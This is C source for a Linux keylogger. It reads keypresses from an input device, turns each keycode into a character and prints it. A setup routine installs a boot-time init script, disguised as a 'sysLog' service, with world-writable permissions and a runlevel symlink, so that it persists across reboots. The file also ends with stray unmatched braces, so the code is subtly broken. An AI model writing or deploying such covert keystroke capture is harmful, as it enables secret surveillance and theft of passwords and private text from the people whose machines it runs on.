#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int createStartupBash(int numArgs, char* directory) {
    FILE *fp = fopen("/etc/init.d/sysLog.sh", "w+");
    FILE *bash = popen("/bin/pwd /etc/", "r");
    char mode[] = "0777";
    char buf[]="/etc/init.d/sysLog.sh";
    int i = strtol(mode, 0, 8);
    char* pathFin;
    char path [1035];
    if (numArgs < 3) {
        if (bash == NULL) {
            printf ("Failed to run command\n");
            return 1;
        }

        fgets(path, sizeof(path)-1, bash);
        pathFin = path;
    } else {
        pathFin = directory;
    }
    fprintf(fp, "#!/bin/sh\n");
    fprintf(fp, "PATH=%s\n", pathFin);
    fprintf(fp, "${PATH}/log /dev/input/event2 ${PATH}");
    
    pclose(bash);
    fclose(fp);
    if (chmod(buf,i)<0)
        printf("error in chmod");
    if (symlink("../init.d/sysLog.sh", "/etc/rc3.d/S05sysLog")<0)
        printf("error in ln");
    return 0;
}

int main(int argc, char **argv)
{
    int fd;
	
    char *values[112]={" ","^","1","2", "3","4","5","6","7","8","9", "0","-","="," Backspace "," Tab ","q","w","e","r","t","y","u","i","o","p","[","]","\n"," Control ","a","s","d","f","g","h","j","k","l",";","\'","~"," Shift ","\\","z","x","c","v","b","n","m", ",", ".", "/"," Shift ","*"," "," "," Caps Lock "," F1 "," F2 "," F3"," F4 "," F5 "," F6 "," F7 "," F8 "," F9 "," F10 ","  Num Lock "," Scroll Lock ","7","8","9","-","4","5","6","+","1","2","3","0",".", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "\n", " ", " ", " ", " ", " ", " ", " UpArrow ", " ", " LeftArrow ", " RightArrow ", " ", " DownArrow ", " ", " ", " Delete "};

    createStartupBash(argc, argv[2]);
    if(argc < 2) {
        printf("usage: %s <device>\n", argv[0]);
        return 1;
    }
    fd = open(argv[1], O_RDONLY);
    struct input_event ev;

    while (1)
    {
	char hold[20] = " ";
    read(fd, &ev, sizeof(struct input_event));

if(ev.type == 1&&ev.value==1){
	
	strcpy(hold,values[ev.code]);
	printf("%s", hold);
	fflush(stdout);
	}

    }
}

    }
}
